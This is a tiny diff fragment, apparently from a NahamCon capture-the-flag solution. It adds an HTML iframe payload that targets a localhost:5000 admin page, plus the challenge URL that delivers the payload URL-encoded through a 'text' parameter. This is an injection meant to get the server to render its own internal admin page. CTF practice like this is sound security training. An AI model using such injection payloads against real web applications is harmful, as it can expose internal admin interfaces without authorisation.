@@ -1,0 +1,4 @@
+<iframe src=http://localhost:5000/admin style="width:342px; height: 222px" sandbox>
+```
+http://challenge.nahamcon.com:31024/exploit?text=%3Ciframe%20src=http://localhost:5000/admin%20style=%22width:342px;%20height:%20222px%22%20sandbox%3E&color=%2324d600
+```
